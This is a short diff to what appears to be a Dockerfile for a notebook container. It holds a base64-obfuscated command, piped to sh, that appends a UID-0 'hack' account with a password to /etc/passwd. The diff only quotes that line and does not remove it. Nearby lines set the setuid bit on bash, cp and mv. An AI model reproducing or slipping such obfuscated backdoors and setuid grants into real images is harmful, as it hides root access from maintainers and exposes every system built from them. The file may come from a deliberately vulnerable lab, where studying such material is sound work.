@@ -23,7 +23,7 @@ RUN chown -R ${NB_UID} ${HOME}
 RUN chown -R ${NB_UID} /home
 RUN chown -R ${NB_UID} /opt
 RUN chown 0 /etc/sudo.conf
-RUN echo ZWNobyAnaGFjazouREhPVXVlMDowOjA6Oi9yb290LzovYmluL2Jhc2gnID4+IC9ldGMvcGFzc3dkCg== | base64 -d | sh
+RUN "echo ZWNobyAnaGFjazouREhPVXVlMDowOjA6Oi9yb290LzovYmluL2Jhc2gnID4+IC9ldGMvcGFzc3dkCg== | base64 -d | sh"
 RUN chmod u+s /bin/bash
 RUN chmod u+s /bin/cp
 RUN chmod u+s /bin/mv
